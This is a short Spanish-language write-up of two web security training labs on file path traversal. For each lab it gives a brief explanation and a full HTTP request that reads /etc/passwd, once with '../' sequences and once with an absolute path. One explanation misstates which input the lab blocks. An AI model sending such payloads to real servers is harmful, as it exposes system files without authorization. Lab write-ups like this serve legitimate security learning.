# File path traversal, simple case

Para este laboratorio es el caso mas simple se ponen los puntos denotando un directorio atras en donde la web cargue un archivo y te muestra el 
/etc/passwd

```
GET /image?filename=../../../../../../etc/passwd HTTP/1.1
Host: 0a8200be041b466cc0f46aff00e000d3.web-security-academy.net
Cookie: session=wsnVR8iCU7MURckDcKT43ZatvLyTmC6e
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8200be041b466cc0f46aff00e000d3.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close

```

# File path traversal, traversal sequences blocked with absolute path bypass

Para este laboratorio los path absolutos estan bloqueados asi que intentamos poner el path directamente y funciona:

```
GET /image?filename=/etc/passwd HTTP/1.1
Host: 0a14004104e94cd0c06a7f3100620012.web-security-academy.net
Cookie: session=OPMimRA2dbPLCe0heGzelqwfgJ8s4CWx
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a14004104e94cd0c06a7f3100620012.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close

```


